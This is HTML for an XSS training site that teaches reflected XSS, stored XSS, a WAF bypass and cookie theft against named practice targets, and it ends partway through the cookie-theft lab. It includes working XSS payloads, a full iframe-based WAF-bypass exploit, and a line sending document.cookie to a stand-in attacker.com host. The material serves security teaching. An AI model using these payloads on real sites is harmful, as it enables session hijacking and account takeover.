+<nav class="sidebar" id="sidebar">
+  <div class="sidebar-header">
+    <div class="logo">
+      <span class="logo-icon">⚡</span>
+      <span class="logo-text">XSS<span class="accent">Academy</span></span>
+    </div>
+    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+  </div>
+
+  <div class="sidebar-section">
+    <div class="section-label">FOUNDATION</div>
+    <button class="nav-item active" data-module="concept">
+      <span class="nav-icon">🧠</span>
+      <span>XSS Concepts</span>
+    </button>
+  </div>
+
+  <div class="sidebar-section">
+    <div class="section-label">LABS</div>
+    <button class="nav-item" data-module="lab1">
+      <span class="nav-icon">🔴</span>
+      <span>Lab 1: Reflected XSS</span>
+      <span class="badge">Easy</span>
+    </button>
+    <button class="nav-item" data-module="lab2">
+      <span class="nav-icon">🔴</span>
+      <span>Lab 2: Stored XSS</span>
+      <span class="badge medium">Med</span>
+    </button>
+    <button class="nav-item" data-module="lab3">
+      <span class="nav-icon">🔴</span>
+      <span>Lab 3: WAF Bypass</span>
+      <span class="badge hard">Hard</span>
+    </button>
+    <button class="nav-item" data-module="lab4">
+      <span class="nav-icon">💀</span>
+      <span>Lab 4: Cookie Theft</span>
+      <span class="badge hard">Adv</span>
+    </button>
+  </div>
+
+  <div class="sidebar-section">
+    <div class="section-label">PROGRESS</div>
+    <div class="progress-area">
+      <div class="progress-bar-wrap">
+        <div class="progress-bar" id="progressBar" style="width:0%"></div>
+      </div>
+      <span class="progress-label" id="progressLabel">0 / 4 Labs</span>
+    </div>
+    <div class="badge-area" id="badgeArea"></div>
+  </div>
+</nav>
+
+<!-- MAIN CONTENT -->
+<main class="main" id="main">
+  <div class="topbar">
+    <div class="breadcrumb" id="breadcrumb">XSS Academy › Concepts</div>
+    <div class="topbar-right">
+      <span class="status-dot"></span>
+      <span class="status-text">Practice Environment — Legal Targets Only</span>
+    </div>
+  </div>
+
+  <!-- ======================= CONCEPT MODULE ======================= -->
+  <div class="module active" id="module-concept">
+    <div class="module-header">
+      <div class="module-tag">FOUNDATION MODULE</div>
+      <h1>Cross-Site Scripting (XSS)</h1>
+      <p class="module-subtitle">Understand the attack before you execute it. A hacker who cannot explain the why is just clicking buttons.</p>
+    </div>
+
+    <div class="concept-grid">
+      <!-- What is XSS -->
+      <div class="concept-card full-width">
+        <div class="card-header"><span class="card-icon">📖</span> What is XSS?</div>
+        <div class="card-body">
+          <p>Cross-Site Scripting (XSS) occurs when a web application takes <strong>user-supplied input</strong> and inserts it into a webpage <strong>without proper validation or encoding</strong>. The browser then interprets this input as code — not data — and executes it.</p>
+          <div class="flow-diagram">
+            <div class="flow-node">User Input</div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-node danger">Application Reflects It</div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-node">Browser Renders HTML</div>
+            <div class="flow-arrow">→</div>
+            <div class="flow-node critical">Script Executes!</div>
+          </div>
+          <div class="callout info">
+            <strong>Key Insight:</strong> The vulnerability is not in the browser. The browser is doing exactly what it's supposed to: running JavaScript it found on a trusted page. The failure is in the <em>application</em> not treating user input as data.
+          </div>
+        </div>
+      </div>
+
+      <!-- Browser Trust Model -->
+      <div class="concept-card">
+        <div class="card-header"><span class="card-icon">🔐</span> The Browser Trust Model</div>
+        <div class="card-body">
+          <p>Browsers apply the <strong>Same-Origin Policy</strong>: scripts from <code>bank.com</code> can access cookies and DOM from <code>bank.com</code>.</p>
+          <ul class="concept-list">
+            <li>Browser trusts anything served from a domain</li>
+            <li>Injected script is served <em>from the victim site</em></li>
+            <li>So the injected script inherits ALL permissions of that site</li>
+            <li>It can read cookies, make requests, modify the DOM</li>
+          </ul>
+          <div class="callout warning">
+            <strong>Attacker Mindset:</strong> I don't need to break into the server. I just need to make the server serve my code to users. Their browser does the rest.
+          </div>
+        </div>
+      </div>
+
+      <!-- Danger -->
+      <div class="concept-card">
+        <div class="card-header"><span class="card-icon">⚠️</span> Why XSS is Dangerous</div>
+        <div class="card-body">
+          <ul class="concept-list danger-list">
+            <li><span class="tag red">Session Hijacking</span> Steal cookies → access accounts without a password</li>
+            <li><span class="tag red">Keylogging</span> Capture every keystroke silently</li>
+            <li><span class="tag red">Phishing</span> Inject fake login forms on a real site</li>
+            <li><span class="tag red">Defacement</span> Modify the visible page for all users</li>
+            <li><span class="tag red">Credential Theft</span> Read autofill passwords</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- 3 Types -->
+      <div class="concept-card full-width">
+        <div class="card-header"><span class="card-icon">🗂️</span> The 3 Types of XSS</div>
+        <div class="card-body">
+          <div class="types-grid">
+            <div class="type-card">
+              <div class="type-label reflected">Reflected</div>
+              <div class="type-desc">Payload is in the URL/request. Server reflects it immediately. Only affects users who click the malicious link.</div>
+              <div class="type-example">URL: <code>?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></div>
+              <div class="type-danger">⚡ Requires victim to click a link</div>
+            </div>
+            <div class="type-card">
+              <div class="type-label stored">Stored</div>
+              <div class="type-desc">Payload is saved to the database. Executes for <strong>every user</strong> who views the page. No special link needed.</div>
+              <div class="type-example">Posted in: comments, profiles, messages</div>
+              <div class="type-danger">💀 Most dangerous — mass victims</div>
+            </div>
+            <div class="type-card">
+              <div class="type-label dom">DOM-Based</div>
+              <div class="type-desc">The vulnerability is entirely client-side. JavaScript reads attacker-controlled data (URL hash, etc.) and writes it to the DOM.</div>
+              <div class="type-example"><code>document.innerHTML = location.hash</code></div>
+              <div class="type-danger">🕵️ Server never sees the payload</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Basic example -->
+      <div class="concept-card full-width">
+        <div class="card-header"><span class="card-icon">🧪</span> A Minimal XSS Example</div>
+        <div class="card-body">
+          <p>Here's a vulnerable PHP snippet — the kind found in millions of real applications:</p>
+          <div class="code-block">
+            <div class="code-label">VULNERABLE CODE (PHP)</div>
+            <pre>&lt;?php
+// User searches for something
+$query = $_GET['q'];
+
+// Developer outputs it directly — NO ENCODING
+echo "&lt;p&gt;You searched for: " . $query . "&lt;/p&gt;";
+?&gt;</pre>
+          </div>
+          <p>If the user inputs <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the server outputs:</p>
+          <div class="code-block danger-code">
+            <div class="code-label">SERVER OUTPUT (DANGEROUS)</div>
+            <pre>&lt;p&gt;You searched for: <span class="highlight-red">&lt;script&gt;alert(1)&lt;/script&gt;</span>&lt;/p&gt;</pre>
+          </div>
+          <p>The browser sees valid HTML with a script tag — and runs it. The fix? One function: <code>htmlspecialchars($query)</code> in PHP, or equivalent encoding in any language.</p>
+          <div class="callout success">
+            <strong>The fix is simple.</strong> The <em>finding</em> is the skill. That's what you'll practice in these labs.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="module-footer">
+      <button class="btn-primary" onclick="goToModule('lab1')">Start Lab 1: Reflected XSS →</button>
+    </div>
+  </div>
+
+  <!-- ======================= LAB 1: REFLECTED XSS ======================= -->
+  <div class="module" id="module-lab1">
+    <div class="module-header">
+      <div class="module-tag lab-tag">LAB 1 — EASY</div>
+      <h1>Reflected XSS</h1>
+      <p class="module-subtitle">Target: <code>http://testphp.vulnweb.com</code> — An intentionally vulnerable practice application by Acunetix.</p>
+    </div>
+
+    <div class="lab-meta-bar">
+      <div class="meta-item"><span>🎯</span> Objective: Inject a script payload via the search bar and confirm execution</div>
+      <div class="meta-item"><span>🛠️</span> Tools: Firefox Browser</div>
+      <div class="meta-item"><span>⚠️</span> Legal practice target only</div>
+    </div>
+
+    <div class="lab-steps" id="lab1-steps">
+
+      <!-- Step 1 -->
+      <div class="step active" id="l1s1">
+        <div class="step-header">
+          <div class="step-number">01</div>
+          <div class="step-title">Identify the Reflection Point</div>
+          <div class="step-status" id="l1s1-status">In Progress</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🎯 What we're doing</h3>
+            <p>Before injecting anything, we need to confirm that user input is actually <strong>reflected back</strong> in the server's response. This is the first diagnostic step in testing for Reflected XSS.</p>
+            <h3>🧠 Why does reflection matter?</h3>
+            <p>If user input appears in the HTML response, the browser will parse it. If we can get the browser to parse our input as code instead of text, we have XSS.</p>
+          </div>
+
+          <div class="sim-container">
+            <div class="sim-label">🖥️ BROWSER SIMULATION — testphp.vulnweb.com</div>
+            <div class="fake-browser">
+              <div class="browser-bar">
+                <div class="browser-dots"><span></span><span></span><span></span></div>
+                <div class="browser-url">http://testphp.vulnweb.com/search.php</div>
+              </div>
+              <div class="browser-body">
+                <div class="fake-searchbar">
+                  <input type="text" id="l1-search-input" placeholder="Search the store..." class="sim-input" />
+                  <button class="sim-btn" onclick="lab1Search()">Search</button>
+                </div>
+                <div class="sim-output" id="l1-search-output"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-instruction">
+            <div class="instruction-number">→</div>
+            <div>Type <code>test</code> in the search bar above and click Search. Observe what happens.</div>
+          </div>
+
+          <div class="quiz-box" id="l1q1" style="display:none">
+            <div class="quiz-question">💬 What does it mean when your input appears in the page output?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">The application is secure — it's just showing your query</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l1s1', 'l1s2')">User input is reflected → this is a potential XSS entry point</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">It means the database is vulnerable to SQL injection</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="step locked" id="l1s2">
+        <div class="step-header">
+          <div class="step-number">02</div>
+          <div class="step-title">Inject a JavaScript Payload</div>
+          <div class="step-status" id="l1s2-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🎯 What we're doing</h3>
+            <p>Now we replace our benign input with a JavaScript payload. The simplest XSS test payload is:</p>
+            <div class="code-block"><pre>&lt;script&gt;alert(1)&lt;/script&gt;</pre></div>
+            <h3>🧠 Why <code>alert(1)</code>?</h3>
+            <p>It's the universal proof-of-concept for XSS. If <code>alert(1)</code> runs, it proves we can execute <em>any</em> JavaScript — including dangerous code like cookie theft. The number 1 is just a marker so you know which payload fired.</p>
+            <h3>🧠 What happens internally?</h3>
+            <ol class="steps-list">
+              <li>You submit <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> as the search query</li>
+              <li>Server builds response: <code>You searched for: &lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+              <li>Browser receives this and parses the HTML</li>
+              <li>Browser finds a <code>&lt;script&gt;</code> tag and executes it</li>
+              <li>Alert fires — XSS confirmed</li>
+            </ol>
+          </div>
+
+          <div class="sim-container">
+            <div class="sim-label">🖥️ BROWSER SIMULATION — Inject XSS Payload</div>
+            <div class="fake-browser">
+              <div class="browser-bar">
+                <div class="browser-dots"><span></span><span></span><span></span></div>
+                <div class="browser-url">http://testphp.vulnweb.com/search.php</div>
+              </div>
+              <div class="browser-body">
+                <div class="fake-searchbar">
+                  <input type="text" id="l1-xss-input" placeholder="Enter your XSS payload..." class="sim-input" value="&lt;script&gt;alert(1)&lt;/script&gt;" />
+                  <button class="sim-btn" onclick="lab1XSSTest()">Inject</button>
+                </div>
+                <div class="sim-output" id="l1-xss-output"></div>
+                <div class="terminal-output" id="l1-terminal" style="display:none"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-instruction">
+            <div class="instruction-number">→</div>
+            <div>Click <strong>Inject</strong> with the pre-filled payload to see the simulation. Observe the terminal output.</div>
+          </div>
+
+          <div class="quiz-box" id="l1q2" style="display:none">
+            <div class="quiz-question">💬 Why does <code>alert(1)</code> work as a proof-of-concept?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">Because alert() is a special privileged function</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l1s2', 'l1s3')">It proves arbitrary JS execution — if alert() runs, so can document.cookie theft</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">It only shows a popup and can't do anything else</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="step locked" id="l1s3">
+        <div class="step-header">
+          <div class="step-number">03</div>
+          <div class="step-title">Understand the Impact</div>
+          <div class="step-status" id="l1s3-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🌍 Real-World Attack Scenario</h3>
+            <p>This Reflected XSS means an attacker could:</p>
+            <ol class="steps-list">
+              <li>Craft a malicious URL: <code>http://testphp.vulnweb.com/search.php?q=&lt;script&gt;...steal-cookie...&lt;/script&gt;</code></li>
+              <li>Send this link to a victim via email, social media, phishing message</li>
+              <li>Victim clicks the link (trusts the domain — it's a real site!)</li>
+              <li>The malicious script runs in the victim's browser with full cookie access</li>
+              <li>Attacker receives the session cookie and logs in as the victim</li>
+            </ol>
+
+            <div class="callout warning">
+              <strong>Why victims trust it:</strong> The URL points to a <em>real, legitimate website</em>. Email filters won't block it. The browser shows a valid SSL certificate. The domain looks trustworthy. This is what makes Reflected XSS so effective for targeted attacks.
+            </div>
+
+            <div class="vulnerability-card">
+              <div class="vuln-title">✅ Vulnerability Confirmed: Reflected XSS</div>
+              <div class="vuln-details">
+                <div><strong>Location:</strong> Search parameter <code>?q=</code></div>
+                <div><strong>Root Cause:</strong> No output encoding — user input rendered as HTML</div>
+                <div><strong>Severity:</strong> <span class="tag red">HIGH</span></div>
+                <div><strong>Fix:</strong> HTML-encode output — e.g., <code>htmlspecialchars()</code> in PHP</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="complete-step-btn">
+            <button class="btn-primary" onclick="completeStep('l1s3', 'lab1')">✅ Mark Lab 1 Complete →</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="module-footer">
+      <button class="btn-secondary" onclick="goToModule('concept')">← Back to Concepts</button>
+      <button class="btn-primary" onclick="goToModule('lab2')">Lab 2: Stored XSS →</button>
+    </div>
+  </div>
+
+  <!-- ======================= LAB 2: STORED XSS ======================= -->
+  <div class="module" id="module-lab2">
+    <div class="module-header">
+      <div class="module-tag lab-tag medium">LAB 2 — MEDIUM</div>
+      <h1>Stored XSS</h1>
+      <p class="module-subtitle">Target: <code>http://testphp.vulnweb.com/guestbook.php</code> — Payload saved in DB, executes for every visitor.</p>
+    </div>
+
+    <div class="lab-meta-bar">
+      <div class="meta-item"><span>🎯</span> Objective: Inject persistent XSS via guestbook, understand why it's more dangerous</div>
+      <div class="meta-item"><span>🛠️</span> Tools: Firefox Browser</div>
+    </div>
+
+    <div class="lab-steps">
+
+      <div class="step active" id="l2s1">
+        <div class="step-header">
+          <div class="step-number">01</div>
+          <div class="step-title">Access the Guestbook & Understand the Target</div>
+          <div class="step-status">In Progress</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🎯 What's different about Stored XSS?</h3>
+            <p>In Reflected XSS, the payload lives in the URL. The victim must click your link. In <strong>Stored XSS</strong>, the payload is saved to a database. Anyone who loads that page gets attacked — automatically, no malicious link needed.</p>
+            <div class="comparison-table">
+              <div class="comp-row header"><div>Feature</div><div>Reflected XSS</div><div>Stored XSS</div></div>
+              <div class="comp-row"><div>Payload location</div><div>URL / request</div><div>Database</div></div>
+              <div class="comp-row"><div>Victim count</div><div>One (who clicks)</div><div class="highlight">Everyone who visits</div></div>
+              <div class="comp-row"><div>Attack persistence</div><div>Once per click</div><div class="highlight">Until removed</div></div>
+              <div class="comp-row"><div>Social engineering</div><div>Required</div><div class="highlight">Not needed</div></div>
+            </div>
+          </div>
+          <div class="sim-container">
+            <div class="sim-label">🖥️ GUESTBOOK SIMULATION — testphp.vulnweb.com/guestbook.php</div>
+            <div class="fake-browser">
+              <div class="browser-bar">
+                <div class="browser-dots"><span></span><span></span><span></span></div>
+                <div class="browser-url">http://testphp.vulnweb.com/guestbook.php</div>
+              </div>
+              <div class="browser-body">
+                <div class="guestbook-form">
+                  <div class="gb-title">📖 Guestbook</div>
+                  <input type="text" id="gb-name" placeholder="Your name" class="sim-input" value="Attacker" />
+                  <textarea id="gb-message" class="sim-textarea" placeholder="Leave a message..."><script>alert('XSS')</script></textarea>
+                  <button class="sim-btn" onclick="gbPost()">Add Message</button>
+                </div>
+                <div id="gb-posts"></div>
+              </div>
+            </div>
+          </div>
+          <div class="step-instruction">
+            <div class="instruction-number">→</div>
+            <div>Click <strong>Add Message</strong> with the pre-filled XSS payload. Then observe what happens when the page "reloads".</div>
+          </div>
+          <div class="quiz-box" id="l2q1" style="display:none">
+            <div class="quiz-question">💬 A stored XSS payload in a comment section will execute:</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">Only once, for the attacker who posted it</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, null, null, 'lab2-complete')">For every user who views the comments page — automatically</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">Only if the victim is on the same Wi-Fi network</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step locked" id="l2s2">
+        <div class="step-header">
+          <div class="step-number">02</div>
+          <div class="step-title">Real-World Impact of Stored XSS</div>
+          <div class="step-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🌍 Scenario: E-commerce Product Review</h3>
+            <p>Imagine this vulnerability on a real e-commerce site with product reviews. The attacker posts a review with a hidden payload:</p>
+            <div class="code-block"><pre>&lt;script&gt;
+  // Silently sends every visitor's session cookie to attacker
+  new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
+&lt;/script&gt;</pre></div>
+            <div class="attack-timeline">
+              <div class="timeline-item"><span class="tl-num">1</span><span>Attacker posts fake 5-star review with hidden payload</span></div>
+              <div class="timeline-item"><span class="tl-num">2</span><span>10,000 shoppers visit the product page over 2 weeks</span></div>
+              <div class="timeline-item"><span class="tl-num">3</span><span>Each visitor's browser silently executes the script</span></div>
+              <div class="timeline-item"><span class="tl-num">4</span><span>10,000 session cookies arrive at attacker's server</span></div>
+              <div class="timeline-item critical"><span class="tl-num">5</span><span>Attacker logs into 10,000 accounts — no passwords needed</span></div>
+            </div>
+            <div class="callout warning">
+              <strong>Real Incidents:</strong> The 2005 MySpace Samy worm used Stored XSS to add "samy is my hero" to over 1 million profiles within 20 hours. British Airways (2018) had a Stored XSS-like attack via a compromised script that stole 500,000 customers' payment details.
+            </div>
+            <div class="vulnerability-card">
+              <div class="vuln-title">✅ Vulnerability Confirmed: Stored XSS</div>
+              <div class="vuln-details">
+                <div><strong>Location:</strong> Guestbook message field</div>
+                <div><strong>Root Cause:</strong> Input stored without sanitization; output without encoding</div>
+                <div><strong>Severity:</strong> <span class="tag red">CRITICAL</span></div>
+                <div><strong>Fix:</strong> Sanitize on input (strip tags) + encode on output</div>
+              </div>
+            </div>
+          </div>
+          <div class="complete-step-btn">
+            <button class="btn-primary" onclick="completeStep('l2s2', 'lab2')">✅ Mark Lab 2 Complete →</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="module-footer">
+      <button class="btn-secondary" onclick="goToModule('lab1')">← Lab 1</button>
+      <button class="btn-primary" onclick="goToModule('lab3')">Lab 3: WAF Bypass →</button>
+    </div>
+  </div>
+
+  <!-- ======================= LAB 3: WAF BYPASS ======================= -->
+  <div class="module" id="module-lab3">
+    <div class="module-header">
+      <div class="module-tag lab-tag hard">LAB 3 — HARD</div>
+      <h1>WAF Bypass XSS</h1>
+      <p class="module-subtitle">PortSwigger Lab — "Reflected XSS into HTML context with most tags and attributes blocked." Think systematically, not randomly.</p>
+    </div>
+
+    <div class="lab-meta-bar">
+      <div class="meta-item"><span>🎯</span> Objective: Call <code>print()</code> despite WAF blocking common payloads</div>
+      <div class="meta-item"><span>🛠️</span> Tools: Burp Suite + Browser</div>
+      <div class="meta-item"><span>🧠</span> Key: Discover what's allowed — don't guess</div>
+    </div>
+
+    <div class="lab-steps">
+
+      <div class="step active" id="l3s1">
+        <div class="step-header">
+          <div class="step-number">01</div>
+          <div class="step-title">Discover the WAF — Hit the Wall First</div>
+          <div class="step-status">In Progress</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🎯 What is a WAF?</h3>
+            <p>A Web Application Firewall (WAF) inspects HTTP requests and blocks ones that match known attack patterns. It's the security layer between the internet and the application.</p>
+            <h3>🧠 Why doesn't a WAF fully stop XSS?</h3>
+            <p>WAFs work on pattern matching — they block known payloads. But HTML is enormous. There are hundreds of tags, thousands of event attributes, and infinite encoding combinations. A WAF that tries to block "everything dangerous" is fighting an impossible battle.</p>
+          </div>
+
+          <div class="sim-container">
+            <div class="sim-label">🖥️ SIMULATION — WAF-Protected Application</div>
+            <div class="fake-browser">
+              <div class="browser-bar">
+                <div class="browser-dots"><span></span><span></span><span></span></div>
+                <div class="browser-url">https://YOUR-LAB-ID.web-security-academy.net/?search=...</div>
+              </div>
+              <div class="browser-body">
+                <div class="fake-searchbar">
+                  <input type="text" id="l3-input" class="sim-input" value="&lt;img src=1 onerror=print()&gt;" />
+                  <button class="sim-btn" onclick="lab3Test()">Send Request</button>
+                </div>
+                <div class="sim-output" id="l3-output"></div>
+              </div>
+            </div>
+          </div>
+          <div class="step-instruction">
+            <div class="instruction-number">→</div>
+            <div>Send the pre-filled payload. Watch the WAF respond.</div>
+          </div>
+          <div class="quiz-box" id="l3q1" style="display:none">
+            <div class="quiz-question">💬 The WAF blocked our payload. What is the RIGHT strategy?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">Keep trying common payloads from a cheat sheet until one works</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l3s1', 'l3s2')">Systematically test which tags and attributes are actually allowed by the WAF</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">The WAF wins — give up</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step locked" id="l3s2">
+        <div class="step-header">
+          <div class="step-number">02</div>
+          <div class="step-title">Use Burp Intruder — Discover Allowed Tags</div>
+          <div class="step-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🔧 The Intruder Strategy</h3>
+            <p>Burp Suite's Intruder tool can automate sending many requests with different payloads. We'll use it to test every HTML tag from the PortSwigger XSS cheat sheet against the WAF.</p>
+            <div class="code-block"><pre>Search parameter format: &lt;§TAG§&gt;
+
+Where §TAG§ is our payload position.
+Intruder will substitute every tag (script, img, body, svg...) one by one.</pre></div>
+          </div>
+
+          <div class="intruder-sim">
+            <div class="intruder-title">🎯 BURP INTRUDER SIMULATION — Tag Discovery</div>
+            <div class="intruder-body">
+              <div class="intruder-controls">
+                <button class="sim-btn" onclick="runIntruderTags()">▶ Start Tag Attack</button>
+                <span class="intruder-status" id="intruder-tag-status">Ready</span>
+              </div>
+              <div class="intruder-results" id="intruder-tag-results">
+                <div class="result-header">
+                  <span>Payload (Tag)</span><span>Status</span><span>Result</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="quiz-box" id="l3q2" style="display:none">
+            <div class="quiz-question">💬 Intruder found that <code>&lt;body&gt;</code> returns 200 OK. What does this mean?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">The body tag doesn't help — we need a script tag</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l3s2', 'l3s3')">The body tag is allowed by the WAF — we can use it to attach event handlers</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">The WAF is broken and all tags are allowed</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step locked" id="l3s3">
+        <div class="step-header">
+          <div class="step-number">03</div>
+          <div class="step-title">Discover Allowed Event Attributes</div>
+          <div class="step-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🎯 From Tags to Attributes</h3>
+            <p>We know <code>&lt;body&gt;</code> is allowed. Now we need an event attribute that executes JavaScript. We test all event attributes (onclick, onmouseover, onresize...) using the same Intruder technique.</p>
+            <div class="code-block"><pre>Search parameter format: &lt;body%20§ATTRIBUTE§=1&gt;
+
+%20 = URL-encoded space
+§ATTRIBUTE§ = payload position for attributes</pre></div>
+          </div>
+
+          <div class="intruder-sim">
+            <div class="intruder-title">🎯 BURP INTRUDER SIMULATION — Attribute Discovery</div>
+            <div class="intruder-body">
+              <div class="intruder-controls">
+                <button class="sim-btn" onclick="runIntruderAttribs()">▶ Start Attribute Attack</button>
+                <span class="intruder-status" id="intruder-attr-status">Ready</span>
+              </div>
+              <div class="intruder-results" id="intruder-attr-results">
+                <div class="result-header">
+                  <span>Payload (Attribute)</span><span>Status</span><span>Result</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="quiz-box" id="l3q3" style="display:none">
+            <div class="quiz-question">💬 <code>onresize</code> is allowed. But it only fires when the window is resized. How do we trigger it automatically?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">We can't — the user must manually resize their window</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">Use JavaScript to call window.resize() directly</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l3s3', 'l3s4')">Embed the target in an iframe, then change the iframe width via onload — this triggers onresize in the embedded page</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step locked" id="l3s4">
+        <div class="step-header">
+          <div class="step-number">04</div>
+          <div class="step-title">Craft the Exploit — iframe Trick</div>
+          <div class="step-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🚀 The Final Exploit</h3>
+            <p>We now build an exploit page hosted on Burp's exploit server. It uses an iframe to load the vulnerable page, then triggers a resize which fires our <code>onresize</code> handler.</p>
+            <div class="code-block">
+              <div class="code-label">EXPLOIT PAYLOAD (on exploit server)</div>
+              <pre>&lt;iframe 
+  src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
+  onload="this.style.width='100px'"
+&gt;&lt;/iframe&gt;</pre>
+            </div>
+            <h3>🧠 Breaking Down the Payload</h3>
+            <div class="payload-breakdown">
+              <div class="pb-row"><code>?search=</code><span>The reflected injection point</span></div>
+              <div class="pb-row"><code>%22%3E</code><span>URL-encoded <code>"&gt;</code> — closes any surrounding HTML attribute</span></div>
+              <div class="pb-row"><code>%3Cbody%20onresize=print()%3E</code><span>URL-encoded <code>&lt;body onresize=print()&gt;</code> — our WAF-bypassing payload</span></div>
+              <div class="pb-row"><code>onload="this.style.width='100px'"</code><span>When iframe loads, changes its own width → triggers onresize in the embedded page → print() fires</span></div>
+            </div>
+          </div>
+
+          <div class="sim-container">
+            <div class="sim-label">🚀 EXPLOIT FLOW VISUALIZATION</div>
+            <div class="exploit-flow">
+              <div class="ef-step"><div class="ef-icon">📤</div><div>Exploit server delivers iframe to victim</div></div>
+              <div class="ef-arrow">↓</div>
+              <div class="ef-step"><div class="ef-icon">🖼️</div><div>Iframe loads vulnerable page with <code>&lt;body onresize=print()&gt;</code></div></div>
+              <div class="ef-arrow">↓</div>
+              <div class="ef-step"><div class="ef-icon">📐</div><div>Iframe's <code>onload</code> changes its own width → triggers resize event</div></div>
+              <div class="ef-arrow">↓</div>
+              <div class="ef-step success"><div class="ef-icon">✅</div><div><code>print()</code> executes — WAF bypassed via event chain!</div></div>
+            </div>
+          </div>
+
+          <div class="callout success">
+            <strong>📌 Key Lesson:</strong> "Advanced XSS is about discovering what is <em>allowed</em>, not forcing what is blocked." — Systematic enumeration beats random guessing every time.
+          </div>
+
+          <div class="vulnerability-card">
+            <div class="vuln-title">✅ WAF Bypass Confirmed</div>
+            <div class="vuln-details">
+              <div><strong>Technique:</strong> Allowed-tag + allowed-event enumeration via Intruder</div>
+              <div><strong>Payload:</strong> <code>&lt;body onresize=print()&gt;</code> via iframe resize trigger</div>
+              <div><strong>Key Insight:</strong> <span class="tag orange">Event handlers don't need &lt;script&gt; tags</span></div>
+            </div>
+          </div>
+
+          <div class="complete-step-btn">
+            <button class="btn-primary" onclick="completeStep('l3s4', 'lab3')">✅ Mark Lab 3 Complete →</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="module-footer">
+      <button class="btn-secondary" onclick="goToModule('lab2')">← Lab 2</button>
+      <button class="btn-primary" onclick="goToModule('lab4')">Lab 4: Cookie Theft →</button>
+    </div>
+  </div>
+
+  <!-- ======================= LAB 4: COOKIE STEALING ======================= -->
+  <div class="module" id="module-lab4">
+    <div class="module-header">
+      <div class="module-tag lab-tag hard">LAB 4 — ADVANCED</div>
+      <h1>Cookie Theft & Session Hijacking</h1>
+      <p class="module-subtitle">PortSwigger Lab — Stored XSS → Exfiltrate session cookie via Burp Collaborator → Hijack victim account.</p>
+    </div>
+
+    <div class="lab-meta-bar">
+      <div class="meta-item"><span>🎯</span> Objective: Steal the victim's session cookie and access their account</div>
+      <div class="meta-item"><span>🛠️</span> Tools: Burp Suite Pro + Collaborator</div>
+      <div class="meta-item"><span>💀</span> Real-world impact: Full account takeover</div>
+    </div>
+
+    <div class="lab-steps">
+
+      <div class="step active" id="l4s1">
+        <div class="step-header">
+          <div class="step-number">01</div>
+          <div class="step-title">Confirm Stored XSS & Understand document.cookie</div>
+          <div class="step-status">In Progress</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🎯 What is document.cookie?</h3>
+            <p>Every website can store cookies in your browser. Session cookies hold your login token — the server uses them to identify you. JavaScript running on a page can read <code>document.cookie</code> and get all cookies for that domain.</p>
+            <div class="code-block"><pre>// In browser console on your bank website:
+document.cookie
+// Returns: "session=abc123; _csrf=xyz; preferences=dark"
+// The session token is all an attacker needs to log in as you</pre></div>
+            <h3>🧠 Why aren't cookies protected?</h3>
